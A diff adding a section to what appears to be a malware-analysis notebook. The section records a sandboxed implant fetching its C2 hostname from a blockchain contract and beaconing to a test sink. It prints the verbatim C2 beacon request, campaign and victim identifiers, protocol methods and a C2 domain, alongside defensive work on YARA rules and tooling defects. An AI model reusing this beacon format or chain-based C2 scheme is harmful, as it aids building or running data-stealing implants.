@@ -2628,6 +2628,131 @@ it delivered the request.
 
 ---
 
+## THE BEACON REACHED THE SINK, AND `bare_host` IS THE ANSWER — 22 Aug
+
+**One `eth_call`, one answer, no retry, and a beacon one second later.** Run
+`4bb6b0d5` (`20260822_155802`), pinned to `bare_host`, `timeout 240`, offsets
+`3, 10, 25, 55`.
+
+    t+150s   eth_call  to 0x4E31128a, selector 0x3bc5de30
+             answered  ABI string, offset 0x20, len 0x1a,
+                       "c0ffee-sink.ringforge.test"
+    t+151s   DNS       c0ffee-sink.ringforge.test
+    t+151s   POST      https://c0ffee-sink.ringforge.test/
+                       method=refresh&guid=...
+
+**The acceptance argument is the retry count, not the absence of an error.**
+Phase 1 recorded **seven** `eth_call`s hammering at ~500 ms intervals because
+each was refused. This run recorded **one**, and then silence:
+`plans_served: ["bare_host"]`, `all_plans_exhausted: false`. The implant asked
+once, was answered, and stopped asking. **`getData()` returns a bare hostname
+and the implant uses it as its C2.** The 22 Aug correction was right, and
+`hex_url` never had to be spent.
+
+### The beacon, verbatim
+
+    POST / HTTP/1.1
+    Authorization: 4b817807-2731-459c-bc5d-4bd914c9eb55
+    Content-Type: application/x-www-form-urlencoded
+    Host: c0ffee-sink.ringforge.test
+    Content-Length: 52
+    Cache-Control: no-cache
+
+    method=refresh&guid=4814CF26358FE5E4F8A1F9B0F4980910
+
+**Two identifiers, and they are not the same thing.** The `Authorization`
+header is the **campaign GUID** -- `$guid` in the YARA rule, hardcoded in the
+config block. Its *purpose* was unknown until now: it is the C2 credential. The
+`guid=` in the body is a different 32-hex value and is almost certainly
+per-victim; check it against the guest's `MachineGuid` with the dashes stripped.
+
+### It chose `https://`, which is why the SAN mattered
+
+`SecurityHealthHost.exe` (pid 7972) opened exactly two connections: `:8545` and
+**`:443`**. Given a bare hostname the implant supplies `https://` on its own.
+
+The beacon arrived **decrypted**, so the handshake succeeded against the
+RingForge CA: **this implant does not pin.** Had the leaf still carried its
+single SAN for the RPC host, that handshake would have failed the way run
+`7ae41ca7` failed -- silent FIN, no request -- and the run would have read as
+`bare_host` rejected. That is the fourth consecutive way this campaign has
+offered to be misread as a rejection.
+
+### What did not happen
+
+**`method=send&guid=&address=` never fired.** Roughly 90 seconds passed between
+the refresh and the end of the window with nothing further. The sink returned
+FakeNet's stock page, which is unlikely to be what the implant expects back.
+
+The window for a fix is narrow: the beacon lands at t+151 and
+`SecurityHealthHost.exe` exits at t+161 (the `process-exit` dump). **Extending
+the timeout buys nothing** -- the host process is gone. Answering `refresh`
+plausibly is the only lever, and that is phase 3.
+
+### Three bench defects this run exposed
+
+None changed the result, and all three would have corrupted the *record*.
+
+1. **`network_iocs.json` is a false negative.** It reports zero notable domains
+   and zero external IPs for the run in which the sample fetched a C2 and
+   beaconed to it, listing only Chromecast and SSDP noise. It reads
+   `capture.pcapng` -- host-side `dumpcap`, 116 KB, which never saw the diverted
+   traffic. Everything real is in FakeNet's own
+   `packets_20260822_115813.pcap` and `fakenet_summary.json`, both of which
+   carry `data-seed-prebsc-1-s1.binance.org` **and**
+   `c0ffee-sink.ringforge.test`. An empty IOC section reads as a finding, which
+   makes this worse than no section at all.
+
+2. **The scanned YARA copy is two days stale.** `memory_yara_summary.rules_dir`
+   is `tools\yara\rules`, and `tools\yara\rules\local\ringforge_etherhiding.yar`
+   is the **20 Aug** file: 1,980 bytes against the canonical 4,401, `$con` still
+   `0x0F14fc3b` (the *wallet*), no `$c2`. `tools\yara\rules\` is gitignored and
+   populated by `bootstrap_yara_rules.ps1`; it has not run since 20 Aug, so
+   **every memory scan since then used pre-correction rules.** Only
+   `RingForge_Split_API_Injection_Loader` matched, on 8 of 10 dumps;
+   `RingForge_EtherHiding_eth_call` fired on none -- including the
+   `SecurityHealthHost` exit dump, taken ten seconds after that process built
+   the `eth_call` and sent the beacon. Whether that is the staleness or a real
+   miss is answerable with `rescan_memory_yara.py` against the dumps already on
+   disk, and **only until the next revert.**
+
+   **This is the third recurrence, and the tool for it was written for the
+   first.** `rescan_memory_yara.py` exists because run `38f27025` on 16 Aug
+   reported `total_matches: 0` for this same reason, and its docstring states
+   the trap in as many words: hand-written rules live in `tools\yara\local\`
+   and reach the scanned tree only through the bootstrap. **A rule edited and
+   committed is not a rule that will fire**, and nothing in the run says so --
+   `rules_dir` is reported, its *freshness* is not. That is the thing worth
+   fixing, rather than remembering to re-run the bootstrap a fourth time.
+
+3. **`dynamic_fakenet_config_path` has no GUI field and does not survive a
+   revert.** It is read only from `config.json`
+   (`gui/dynamic_window.py`), and the window *writes it back* from an
+   empty var on every save -- so editing `config.json` with the GUI open and
+   then pressing Run silently discards it and runs the stock FakeNet config.
+   Port 8545 is then never routed and the outcome is `no_connection`, which is
+   indistinguishable from a diverter fault. The code comment beside it already
+   says this happened once; it nearly happened again.
+
+### Where this leaves `0bw`
+
+Proven, on the wire, in one run:
+
+- `getData()` -> bare hostname -> the implant's C2. EtherHiding delivery, end to
+  end, with the operator choosing the destination.
+- The transport is HTTPS on 443, and the certificate is **not pinned**.
+- The campaign GUID is the `Authorization` credential.
+- A per-victim 32-hex ID travels in the body.
+
+Still open:
+
+- **`method=send&address=`** -- the substitution beacon. Needs a plausible
+  answer to `refresh` inside a ~10-second window.
+- **The contract's transaction history** -- deployer and rotation timeline. Not
+  pulled; it is a query against the live chain from this network.
+- **`klopasnarhia.cc`** -- still unresolved and unqueried by this bench.
+
+
 ## THE CONTRACT IS LIVE AND THE C2 IS `klopasnarhia.cc` — 22 Aug
 
 **One read of the chain answered what four detonations could not.**
